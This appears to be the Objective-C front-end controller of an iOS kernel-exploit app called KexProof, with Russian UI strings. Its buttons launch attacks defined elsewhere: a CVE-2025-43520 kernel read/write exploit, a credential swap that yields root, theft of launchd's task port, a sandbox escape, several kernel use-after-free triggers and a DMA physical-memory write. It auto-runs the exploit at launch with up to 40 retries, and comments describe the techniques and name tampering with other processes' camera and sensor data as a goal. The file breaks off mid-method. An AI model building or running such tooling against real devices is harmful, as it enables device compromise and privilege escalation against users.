#import "KPViewController.h"
#import "KPLog.h"
#import "KPRunner.h"
#import "KPDump.h"

#import <unistd.h>

@interface KPViewController ()
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UIButton *exploitButton;
@property (nonatomic, strong) UIButton *dumpButton;
@property (nonatomic, strong) UIButton *sptmButton;
@property (nonatomic, strong) UIButton *sptmTableButton;
@property (nonatomic, strong) UIButton *surveyButton;
@property (nonatomic, strong) UIButton *rootButton;
@property (nonatomic, strong) UIButton *nestRaceButton;
@property (nonatomic, strong) UIButton *e10Button;
@property (nonatomic, strong) UIButton *e11Button;
@property (nonatomic, strong) UIButton *m2Button;
@property (nonatomic, strong) UIButton *m2uafButton;
@property (nonatomic, strong) UIButton *physmapButton;
@property (nonatomic, strong) UIButton *geoButton;
@property (nonatomic, strong) UIButton *gartButton;
@property (nonatomic, strong) UIButton *m2tButton;
@property (nonatomic, strong) UIButton *jpegButton;
@property (nonatomic, strong) UIButton *m2oButton;
@property (nonatomic, strong) UIButton *dmaButton;
@property (nonatomic, strong) UIButton *shareButton;
@property (nonatomic, strong) UILabel *statusLabel;
@property (nonatomic, copy, nullable) NSString *reportPath;
@property (nonatomic) BOOL jobRunning;

// Defined below; callers sit earlier in the file.
- (void)saveExperimentReport:(NSString *)text fileName:(NSString *)fileName;
@end

@implementation KPViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    NSLog(@"[KexProof] screen: main");
    self.title = @"KexProof";
    self.view.backgroundColor = [UIColor colorWithRed:0.07 green:0.07 blue:0.09 alpha:1.0];

    UILabel *titleLabel = [self makeLabel:28 weight:UIFontWeightBold color:[UIColor whiteColor]];
    titleLabel.text = @"KexProof";
    titleLabel.textAlignment = NSTextAlignmentCenter;

    UILabel *subtitle = [self makeLabel:13 weight:UIFontWeightRegular color:[UIColor colorWithRed:0.55 green:0.85 blue:0.65 alpha:1.0]];
    subtitle.text = @"CVE-2025-43520 · ClearSword · дамп SPTM/TXM · 1.9.183";
    subtitle.textAlignment = NSTextAlignmentCenter;

    self.statusLabel = [self makeLabel:13 weight:UIFontWeightSemibold color:[UIColor secondaryLabelColor]];
    self.statusLabel.text = @"Готов. Нажмите «Запустить эксплойт».";
    self.statusLabel.textAlignment = NSTextAlignmentCenter;

    self.logView = [[UITextView alloc] init];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor colorWithRed:0.03 green:0.03 blue:0.04 alpha:1.0];
    self.logView.textColor = [UIColor colorWithRed:0.75 green:0.95 blue:0.75 alpha:1.0];
    self.logView.layer.cornerRadius = 10;
    self.logView.layer.borderWidth = 1;
    self.logView.layer.borderColor = [UIColor colorWithWhite:1.0 alpha:0.15].CGColor;
    self.logView.textContainerInset = UIEdgeInsetsMake(8, 8, 8, 8);
    self.logView.text = @"";

    self.exploitButton = [self makeButton:@"Запустить эксплойт"
                                    color:[UIColor colorWithRed:0.20 green:0.55 blue:0.35 alpha:1.0]];
    [self.exploitButton addTarget:self action:@selector(exploitTapped) forControlEvents:UIControlEventTouchUpInside];

    // 1.5.9: the dump is a separate button. The exploit's win stays banked in
    // this process (hasKRW), and the dump writes incrementally — a panic in a
    // late section no longer costs a re-race of the probabilistic exploit.
    self.dumpButton = [self makeButton:@"Дамп структур (после УСПЕШЕН)"
                                 color:[UIColor colorWithRed:0.30 green:0.45 blue:0.60 alpha:1.0]];
    [self.dumpButton addTarget:self action:@selector(dumpTapped) forControlEvents:UIControlEventTouchUpInside];

    // Physmap write user test: пишется ли userland-страница через physmap
    // kernel VA — ключ к подмене данных процессов (камера/сенсоры/Ghost).
    self.physmapButton = [self makeButton:@"Physmap write user page test"
                                    color:[UIColor colorWithRed:0.25 green:0.55 blue:0.45 alpha:1.0]];
    [self.physmapButton addTarget:self action:@selector(physmapTapped) forControlEvents:UIControlEventTouchUpInside];

    self.geoButton = [self makeButton:@"Reachability matrix (какие сервисы открыты)"
                                color:[UIColor colorWithRed:0.20 green:0.50 blue:0.62 alpha:1.0]];
    [self.geoButton addTarget:self action:@selector(geoTapped) forControlEvents:UIControlEventTouchUpInside];

    self.gartButton = [self makeButton:@"GART recon (IOGPU, read-only)"
                                 color:[UIColor colorWithRed:0.35 green:0.45 blue:0.30 alpha:1.0]];
    [self.gartButton addTarget:self action:@selector(gartTapped) forControlEvents:UIControlEventTouchUpInside];

    self.m2uafButton = [self makeButton:@"NECP UAF (flow dangling)"
                                  color:[UIColor colorWithRed:0.65 green:0.18 blue:0.18 alpha:1.0]];
    [self.m2uafButton addTarget:self action:@selector(m2uafTapped) forControlEvents:UIControlEventTouchUpInside];

    // CVE-2026-43655 teardown race: calibration-first (фаза A kread-only),
    // затем close victim'а ПОД параллельным submitter'ом. ДЕСТРУКТИВНО.
    self.m2tButton = [self makeButton:@"M2 teardown UAF (CVE-2026-43655)"
                                color:[UIColor colorWithRed:0.58 green:0.30 blue:0.10 alpha:1.0]];
    [self.m2tButton addTarget:self action:@selector(m2tTapped) forControlEvents:UIControlEventTouchUpInside];

    // CVE-2026-20687: startDecoder UAF, victim→reclaim→trigger. Паника (MTE
    // tag fault) = подтверждение. Reachability 1.9.92: драйвер ОТКРЫТ.
    self.jpegButton = [self makeButton:@"JPEG startDecoder UAF (CVE-2026-20687)"
                                 color:[UIColor colorWithRed:0.50 green:0.16 blue:0.34 alpha:1.0]];
    [self.jpegButton addTarget:self action:@selector(jpegTapped) forControlEvents:UIControlEventTouchUpInside];

    // Итерация 3: управляемый OOB-read (credit=индекс), НЕ краш. По панике
    // 045942: discovery scheduler'а → свип смещений, валидация против kread.
    self.m2oButton = [self makeButton:@"M2 oracle (OOB-read, без паники)"
                                color:[UIColor colorWithRed:0.16 green:0.45 blue:0.55 alpha:1.0]];
    [self.m2oButton addTarget:self action:@selector(m2oTapped) forControlEvents:UIControlEventTouchUpInside];

    // DMA physwrite через подмену backing PA поверхности (DART мимо SPTM):
    // контрольная страница → маркер; дальше защищённая страница (proc_ro).
    self.dmaButton = [self makeButton:@"DMA physwrite (IOSurface PA swap)"
                                color:[UIColor colorWithRed:0.55 green:0.45 blue:0.12 alpha:1.0]];
    [self.dmaButton addTarget:self action:@selector(dmaTapped) forControlEvents:UIControlEventTouchUpInside];

    self.shareButton = [self makeButton:@"Поделиться отчётом"
                                  color:[UIColor colorWithRed:0.25 green:0.35 blue:0.60 alpha:1.0]];
    [self.shareButton addTarget:self action:@selector(shareTapped) forControlEvents:UIControlEventTouchUpInside];
    // Always tappable: it shares the report if present AND the live log, so a
    // panic before any dump still leaves something to send back.
    self.shareButton.enabled = YES;
    self.shareButton.alpha = 1.0;

    [self updateExperimentButtons];

    [self.view addSubview:titleLabel];
    [self.view addSubview:subtitle];
    [self.view addSubview:self.statusLabel];
    [self.view addSubview:self.logView];
    [self.view addSubview:self.exploitButton];
    [self.view addSubview:self.dumpButton];
    [self.view addSubview:self.physmapButton];
    [self.view addSubview:self.geoButton];
    [self.view addSubview:self.gartButton];
    [self.view addSubview:self.m2uafButton];
    [self.view addSubview:self.m2tButton];
    [self.view addSubview:self.jpegButton];
    [self.view addSubview:self.m2oButton];
    [self.view addSubview:self.dmaButton];
    [self.view addSubview:self.shareButton];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [titleLabel.topAnchor constraintEqualToAnchor:safe.topAnchor constant:10],
        [titleLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [titleLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],

        [subtitle.topAnchor constraintEqualToAnchor:titleLabel.bottomAnchor constant:2],
        [subtitle.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [subtitle.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],

        [self.statusLabel.topAnchor constraintEqualToAnchor:subtitle.bottomAnchor constant:8],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],

        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:8],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.logView.bottomAnchor constraintEqualToAnchor:self.exploitButton.topAnchor constant:-10],

        [self.exploitButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.exploitButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.exploitButton.heightAnchor constraintEqualToConstant:46],
        [self.exploitButton.bottomAnchor constraintEqualToAnchor:self.dumpButton.topAnchor constant:-8],

        [self.dumpButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.dumpButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.dumpButton.heightAnchor constraintEqualToConstant:38],
        [self.dumpButton.bottomAnchor constraintEqualToAnchor:self.physmapButton.topAnchor constant:-7],

        [self.physmapButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.physmapButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.physmapButton.heightAnchor constraintEqualToConstant:38],
        [self.physmapButton.bottomAnchor constraintEqualToAnchor:self.geoButton.topAnchor constant:-7],

        [self.geoButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.geoButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.geoButton.heightAnchor constraintEqualToConstant:38],
        [self.geoButton.bottomAnchor constraintEqualToAnchor:self.gartButton.topAnchor constant:-7],

        [self.gartButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.gartButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.gartButton.heightAnchor constraintEqualToConstant:38],
        [self.gartButton.bottomAnchor constraintEqualToAnchor:self.m2uafButton.topAnchor constant:-7],

        [self.m2uafButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.m2uafButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.m2uafButton.heightAnchor constraintEqualToConstant:38],
        [self.m2uafButton.bottomAnchor constraintEqualToAnchor:self.m2tButton.topAnchor constant:-7],

        [self.m2tButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.m2tButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.m2tButton.heightAnchor constraintEqualToConstant:38],
        [self.m2tButton.bottomAnchor constraintEqualToAnchor:self.jpegButton.topAnchor constant:-7],

        [self.jpegButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.jpegButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.jpegButton.heightAnchor constraintEqualToConstant:38],
        [self.jpegButton.bottomAnchor constraintEqualToAnchor:self.m2oButton.topAnchor constant:-7],

        [self.m2oButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.m2oButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.m2oButton.heightAnchor constraintEqualToConstant:38],
        [self.m2oButton.bottomAnchor constraintEqualToAnchor:self.dmaButton.topAnchor constant:-7],

        [self.dmaButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.dmaButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.dmaButton.heightAnchor constraintEqualToConstant:38],
        [self.dmaButton.bottomAnchor constraintEqualToAnchor:self.shareButton.topAnchor constant:-8],

        [self.shareButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.shareButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.shareButton.heightAnchor constraintEqualToConstant:40],
        [self.shareButton.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-10],
    ]];

    __weak typeof(self) weakSelf = self;
    [KPLog shared].onAppend = ^(NSString *text) {
        [weakSelf appendLogText:text];
    };

    [[KPLog shared] appendFormat:@"=== запуск KexProof %@ @ %@ ===",
        [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [NSDate date]];
    [[KPLog shared] append:@"KexProof загружен. Эксплойт работает в обычной песочнице приложения, без джейлбрейк-энтитлментов."];

    // 1.9.91: auto-fire the exploit 1.5s after launch — after a panic-reboot
    // the whole ritual is: open the app, put the phone down, wait.
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        if (!self.jobRunning && !KPRunner.hasKRW) {
            [[KPLog shared] append:@"[auto] запускаю эксплойт сам (автостарт)"];
            [self exploitTapped];
        }
    });
}

- (UILabel *)makeLabel:(CGFloat)size weight:(UIFontWeight)weight color:(UIColor *)color {
    UILabel *label = [[UILabel alloc] init];
    label.translatesAutoresizingMaskIntoConstraints = NO;
    label.font = [UIFont systemFontOfSize:size weight:weight];
    label.textColor = color;
    label.numberOfLines = 0;
    return label;
}

- (UIButton *)makeButton:(NSString *)title color:(UIColor *)color {
    UIButton *button = [UIButton buttonWithType:UIButtonTypeSystem];
    button.translatesAutoresizingMaskIntoConstraints = NO;
    [button setTitle:title forState:UIControlStateNormal];
    [button setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    button.backgroundColor = color;
    button.titleLabel.font = [UIFont systemFontOfSize:15 weight:UIFontWeightSemibold];
    button.layer.cornerRadius = 10;
    button.clipsToBounds = YES;
    return button;
}

- (void)setExperimentButton:(UIButton *)button enabled:(BOOL)enabled {
    button.enabled = enabled;
    button.alpha = enabled ? 1.0 : 0.45;
}

- (void)updateExperimentButtons {
    BOOL krw = KPRunner.hasKRW && !self.jobRunning;
    [self setExperimentButton:self.exploitButton enabled:!self.jobRunning && !KPRunner.hasKRW];
    [self setExperimentButton:self.dumpButton enabled:krw];
    [self setExperimentButton:self.physmapButton enabled:krw];
    [self setExperimentButton:self.geoButton enabled:!self.jobRunning];
    [self setExperimentButton:self.gartButton enabled:krw];
    [self setExperimentButton:self.m2tButton enabled:krw];
    [self setExperimentButton:self.jpegButton enabled:krw];
    [self setExperimentButton:self.m2oButton enabled:krw];
    [self setExperimentButton:self.dmaButton enabled:krw];
}

- (void)appendLogText:(NSString *)text {
    if (!text.length) return;
    NSTextStorage *storage = self.logView.textStorage;
    [storage beginEditing];
    NSDictionary *attributes = @{NSFontAttributeName: self.logView.font,
                                 NSForegroundColorAttributeName: self.logView.textColor};
    [storage appendAttributedString:[[NSAttributedString alloc] initWithString:text attributes:attributes]];
    if (storage.length > 262144) {
        NSRange trim = [storage.string rangeOfComposedCharacterSequencesForRange:
                        NSMakeRange(0, storage.length - 196608)];
        [storage deleteCharactersInRange:trim];
    }
    [storage endEditing];
    if (storage.length > 0) {
        NSRange end = NSMakeRange(storage.length - 1, 1);
        [self.logView scrollRangeToVisible:end];
    }
}

- (BOOL)beginJob {
    if (self.jobRunning) return NO;
    self.jobRunning = YES;
    [self updateExperimentButtons];
    return YES;
}

- (void)runDiagnosticWithStatus:(NSString *)status
                          work:(NSDictionary *(^)(void))work
                    completion:(void (^)(NSDictionary *))completion {
    if (!KPRunner.hasKRW || ![self beginJob]) return;
    self.statusLabel.text = status;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary *result = nil;
        NSString *failure = nil;
        @try {
            result = work();
        } @catch (NSException *exception) {
            failure = exception.reason ?: exception.name;
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            @try {
                if (failure) {
                    self.statusLabel.text = @"Операция прервана — см. журнал";
                    [[KPLog shared] appendFormat:@"Ошибка: %@", failure];
                } else {
                    completion(result);
                }
            } @catch (NSException *exception) {
                self.statusLabel.text = @"Ошибка сохранения результата — см. журнал";
                [[KPLog shared] appendFormat:@"Ошибка: %@", exception.reason ?: exception.name];
            } @finally {
                self.jobRunning = NO;
                [self updateExperimentButtons];
            }
        });
    });
}

// Тот же паттерн, что runDiagnosticWithStatus, но БЕЗ гейта hasKRW —
// для чистых userland-проб (M2Scaler IOKit probe).
- (void)runUnprivilegedDiagnosticWithStatus:(NSString *)status
                                       work:(NSDictionary *(^)(void))work
                                 completion:(void (^)(NSDictionary *))completion {
    if (![self beginJob]) return;
    self.statusLabel.text = status;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary *result = nil;
        NSString *failure = nil;
        @try {
            result = work();
        } @catch (NSException *exception) {
            failure = exception.reason ?: exception.name;
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            @try {
                if (failure) {
                    self.statusLabel.text = @"Операция прервана — см. журнал";
                    [[KPLog shared] appendFormat:@"Ошибка: %@", failure];
                } else {
                    completion(result);
                }
            } @catch (NSException *exception) {
                self.statusLabel.text = @"Ошибка сохранения результата — см. журнал";
                [[KPLog shared] appendFormat:@"Ошибка: %@", exception.reason ?: exception.name];
            } @finally {
                self.jobRunning = NO;
                [self updateExperimentButtons];
            }
        });
    });
}

// Writes an experiment report to Documents and points the share button at it.
- (void)saveExperimentReport:(NSString *)text fileName:(NSString *)fileName {
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *path = [docs stringByAppendingPathComponent:fileName];
    NSString *full = [text stringByAppendingFormat:@"\n\n--- Полный журнал ---\n%@", [KPLog shared].transcript];
    NSError *error = nil;
    if ([full writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
        self.reportPath = path;
        self.shareButton.enabled = YES;
        self.shareButton.alpha = 1.0;
        [[KPLog shared] appendFormat:@"Отчёт записан: %@", path];
    }
    else {
        [[KPLog shared] appendFormat:@"Не удалось записать %@: %@", fileName, error];
        self.statusLabel.text = @"Не удалось сохранить отчёт — см. журнал";
    }
}

- (void)exploitTapped {
    [self exploitTappedWithRetry:0];
}

// 1.9.91: auto-run + auto-retry. A failed attempt that did NOT panic returns
// here with the app alive — so we just go again, 2s later, until a win. The
// race is a lottery; tapping is not the user's job.
- (void)exploitTappedWithRetry:(int)attempt {
    if (![self beginJob]) return;
    self.statusLabel.text = attempt
        ? [NSString stringWithFormat:@"Авто-повтор #%d… (гонка идёт)", attempt]
        : @"Выполняется… (эксплойт может идти несколько минут)";

    [KPRunner runExploitWithCompletion:^(BOOL success) {
        if (success) {
            self.statusLabel.text = @"KRW жив, константы готовы. Жми «Дамп структур».";
            [self.exploitButton setTitle:@"Эксплойт пройден" forState:UIControlStateNormal];
            self.jobRunning = NO;
            [self updateExperimentButtons];
            return;
        }
        self.jobRunning = NO;
        [self updateExperimentButtons];
        if (attempt < 40) {
            self.statusLabel.text = [NSString stringWithFormat:@"Не удалось — автоповтор через 2с (попытка %d)", attempt + 1];
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)),
                           dispatch_get_main_queue(), ^{
                [self exploitTappedWithRetry:attempt + 1];
            });
        } else {
            self.statusLabel.text = @"Эксплойт не удался 40 раз подряд — перезапусти приложение.";
            [self.exploitButton setTitle:@"Повторить эксплойт" forState:UIControlStateNormal];
        }
    }];
}

- (void)dumpTapped {
    if (!KPRunner.hasKRW || ![self beginJob]) return;
    self.statusLabel.text = @"Дамп… (пишется инкрементально, паника не сотрёт готовое)";

    [KPRunner runDumpWithCompletion:^(BOOL success, NSString *reportPath) {
        if (success && reportPath) {
            self.reportPath = reportPath;
            self.statusLabel.text = @"Готово. Отчёт: Documents/kexproof-dump.txt";
            self.shareButton.enabled = YES;
            self.shareButton.alpha = 1.0;
        }
        else {
            self.statusLabel.text = @"Дамп прерван — частичный отчёт уже на диске, жми «Поделиться».";
            self.reportPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-dump.txt"];
        }
        self.jobRunning = NO;
        [self updateExperimentButtons];
    }];
}

- (void)sptmTapped {
    [self runDiagnosticWithStatus:@"A0: выполняется…" work:^NSDictionary *{
        return @{@"report": [KPDump sptmWriteTestReport]};
    } completion:^(NSDictionary *result) {
        self.statusLabel.text = @"A0 завершён — см. лог";
        [self appendLogText:result[@"report"]];
    }];
}

- (void)sptmTableTapped {
    [self runDiagnosticWithStatus:@"A1: frame_table… (может ребутнуть!)" work:^NSDictionary *{
        return @{@"report": [KPDump sptmFrameTableWriteTestReport]};
    } completion:^(NSDictionary *result) {
        self.statusLabel.text = @"A1 завершён — см. лог";
        [self appendLogText:result[@"report"]];
    }];
}

- (void)surveyTapped {
    [self runDiagnosticWithStatus:@"E1–E3: обзор SPTM… (read-only)" work:^NSDictionary *{
        NSString *survey = [KPDump sptmSurveyReport];
        // Refresh the main dump too: it now embeds the fixed allproc (EXP-01)
        // and the harvested SPTM/TXM bases (EXP-02).
        NSString *dump = [KPDump buildReport];
        return @{@"survey": survey, @"dump": dump};
    } completion:^(NSDictionary *result) {
            NSString *survey = result[@"survey"];
            NSString *dump = result[@"dump"];
            self.statusLabel.text = @"E1–E3 завершены — см. лог";
            [self appendLogText:survey];
            [self saveExperimentReport:survey fileName:@"kexproof-e1e3-survey.txt"];
            NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
            NSError *error = nil;
            if (![dump writeToFile:[docs stringByAppendingPathComponent:@"kexproof-dump.txt"]
                   atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
                self.statusLabel.text = @"Не удалось сохранить дамп — см. журнал";
                [[KPLog shared] appendFormat:@"Ошибка сохранения дампа: %@", error];
            }
    }];
}

- (void)rootTapped {
    if (!KPRunner.hasKRW || self.jobRunning) return;
    UIAlertController *confirm = [UIAlertController
        alertControllerWithTitle:@"E9: ucred swap"
        message:@"Одна 8-байтная heap-запись: proc_ro->p_ucred → форг в pipe-буфере (uid/gid 0, label очищен). Форг не освобождается, оригинал логируется. Малый риск паники. Продолжить?"
        preferredStyle:UIAlertControllerStyleAlert];
    [confirm addAction:[UIAlertAction actionWithTitle:@"Отмена" style:UIAlertActionStyleCancel handler:nil]];
    __weak typeof(self) weakSelf = self;
    [confirm addAction:[UIAlertAction actionWithTitle:@"Выполнить" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action) {
        [weakSelf runRootSwap];
    }]];
    [self presentViewController:confirm animated:YES completion:nil];
}

- (void)runRootSwap {
    [self runDiagnosticWithStatus:@"E9: выполняется…" work:^NSDictionary *{
        return @{@"report": [KPDump ucredHeapSwapReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL root = (getuid() == 0);
            self.statusLabel.text = root ? @"E9 PASS: uid 0 (root) — см. лог" : @"E9 завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-e9-ucred.txt"];
    }];
}

- (void)nestRaceTapped {
    [self runDiagnosticWithStatus:@"EXP-13: гонка nest/unnest… (может ребутнуть!)" work:^NSDictionary *{
        return @{@"report": [KPDump sptmNestRaceReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"EXP-13 завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-exp13.txt"];
    }];
}

// E10: только по кнопке — KPRunner его не трогает. Гейт на hasKRW живёт
// внутри runDiagnosticWithStatus.
- (void)e10Tapped {
    [self runDiagnosticWithStatus:@"E10: кража task-port launchd…" work:^NSDictionary *{
        return @{@"report": [KPDump taskPortTheftReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL pass = [report containsString:@"E10 PASS"];
            self.statusLabel.text = pass ? @"E10 PASS: task port launchd (pid 1) — см. лог"
                                         : @"E10 завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-e10.txt"];
    }];
}

// E11: только по кнопке, тот же гейт hasKRW внутри runDiagnosticWithStatus.
- (void)e11Tapped {
    [self runDiagnosticWithStatus:@"E11: proc_ro-swap…" work:^NSDictionary *{
        return @{@"report": [KPDump procRoSwapReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL pass = [report containsString:@"E11 PASS"];
            self.statusLabel.text = pass ? @"E11 PASS: root + unsandbox — см. лог"
                                         : @"E11 завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-e11.txt"];
    }];
}

// M2Scaler probe: KRW не нужен (IOKit open/close из sandbox), поэтому
// безгейтовый вариант runDiagnosticWithStatus.
- (void)m2Tapped {
    [self runUnprivilegedDiagnosticWithStatus:@"M2Scaler: IOKit probe…" work:^NSDictionary *{
        return @{@"report": [KPDump m2ScalerReachabilityReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL reachable = [report containsString:@"M2SCALER REACHABLE"];
            self.statusLabel.text = reachable ? @"M2Scaler REACHABLE — CVE-2025-43510/43655 доступны!"
                                              : @"M2Scaler закрыт sandbox'ом — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-m2scaler.txt"];
    }];
}

// M2Scaler teardown UAF (CVE-2026-43655): ДЕСТРУКТИВНО — успех это паника,
// тогда completion не выполнится никогда (всё уже sync-записано в live-log).
// Если completion отработал — паники не было: баг не сработал в этом прогоне.
- (void)m2uafTapped {
    [self runUnprivilegedDiagnosticWithStatus:@"JPEG UAF: victim→reclaim→trigger… (МОЖЕТ ПАНИКОВАТЬ!)" work:^NSDictionary *{
        return @{@"report": [KPDump necpUafProbeReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL ran = ![report containsString:@"NECP SKIP"];
            self.statusLabel.text = ran ? @"NECP UAF: готово — см. лог"
                                        : @"NECP: прогон невозможен — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-necp.txt"];
    }];
}

// Physmap write user test: только по кнопке, гейт hasKRW живёт внутри
// runDiagnosticWithStatus.
- (void)physmapTapped {
    [self runDiagnosticWithStatus:@"Physmap write user: выполняется…" work:^NSDictionary *{
        return @{@"report": [KPDump physmapWriteUserTestReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL pass = [report containsString:@"PHYSMAP WRITE USER PASS"];
            self.statusLabel.text = pass ? @"PHYSMAP WRITE USER PASS — подмена данных процессов доступна"
                                         : @"Physmap write user завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-physmapwrite.txt"];
    }];
}

- (void)gartTapped {
    [self runDiagnosticWithStatus:@"GART recon: выполняется…" work:^NSDictionary *{
        return @{@"report": [KPDump gartProbeReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"GART recon завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-gart.txt"];
    }];
}

- (void)geoTapped {
    [self runUnprivilegedDiagnosticWithStatus:@"Reachability-матрица: выполняется…" work:^NSDictionary *{
        return @{@"report": [KPDump reachabilityReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"Reachability: готово — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-reachability.txt"];
    }];
}

- (void)m2tTapped {
    [self runDiagnosticWithStatus:@"M2 teardown UAF: калибровка → гонка (паника возможна)…" work:^NSDictionary *{
        return @{@"report": [KPDump m2TeardownUafReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"M2 teardown: прогон завершён без паники — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-m2teardown.txt"];
    }];
}

- (void)jpegTapped {
    [self runDiagnosticWithStatus:@"JPEG startDecoder UAF: victim→reclaim→trigger (паника = подтверждение)…" work:^NSDictionary *{
        return @{@"report": [KPDump jpegUafReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"JPEG UAF: прогон завершён без паники — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-jpeg.txt"];
    }];
}

- (void)m2oTapped {
    [self runDiagnosticWithStatus:@"M2 oracle: discovery scheduler'а → OOB-read свип…" work:^NSDictionary *{
        return @{@"report": [KPDump m2OracleReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            self.statusLabel.text = @"M2 oracle: готово — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-m2oracle.txt"];
    }];
}

- (void)dmaTapped {
    [self runDiagnosticWithStatus:@"DMA physwrite: поиск surface → подмена PA → scaler submit…" work:^NSDictionary *{
        return @{@"report": [KPDump iosurfacePaSwapReport]};
    } completion:^(NSDictionary *result) {
            NSString *report = result[@"report"];
            BOOL win = [report containsString:@"PHYSWRITE DMA CONFIRMED"];
            self.statusLabel.text = win ? @"DMA PHYSWRITE CONFIRMED — защищённые страницы следующие"
                                        : @"DMA physwrite завершён — см. лог";
            [self appendLogText:report];
            [self saveExperimentReport:report fileName:@"kexproof-paswap.txt"];
    }];
}

- (void)shareTapped {
    NSMutableArray *items = [NSMutableArray array];
    if (self.reportPath) {
        [items addObject:[NSURL fileURLWithPath:self.reportPath]];
    }
    NSString *live = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-live.log"];
    if ([[NSFileManager defaultManager] fileExistsAtPath:live]) {
